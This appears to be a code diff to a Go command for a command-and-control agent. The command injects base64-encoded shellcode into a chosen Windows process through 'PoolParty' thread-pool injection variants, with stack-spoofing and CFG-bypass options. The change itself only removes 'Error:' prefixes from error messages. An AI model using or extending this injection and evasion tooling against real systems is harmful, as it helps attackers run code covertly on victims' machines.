@@ -57,7 +57,7 @@ type PoolPartyInjectionParams struct {
 func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	ensureInjectionAPIs()
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	params, parseErr := unmarshalParams[PoolPartyInjectionParams](task)
@@ -66,7 +66,7 @@ func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandRe
 	}
 
 	if params.ShellcodeB64 == "" {
-		return errorResult("Error: No shellcode data provided")
+		return errorResult("No shellcode data provided")
 	}
 
 	// Auto-select target if target mode is specified
@@ -84,16 +84,16 @@ func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandRe
 	}
 
 	if params.PID <= 0 {
-		return errorResult("Error: Invalid PID specified")
+		return errorResult("Invalid PID specified")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: Shellcode data is empty")
+		return errorResult("Shellcode data is empty")
 	}
 
 	if params.StackSpoof {
@@ -121,7 +121,7 @@ func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandRe
 	case 8:
 		output, err = executeVariant8(shellcode, uint32(params.PID), params.CFGBypass)
 	default:
-		return errorf("Error: Unsupported variant %d", params.Variant)
+		return errorf("Unsupported variant %d", params.Variant)
 	}
 
 	if err != nil {
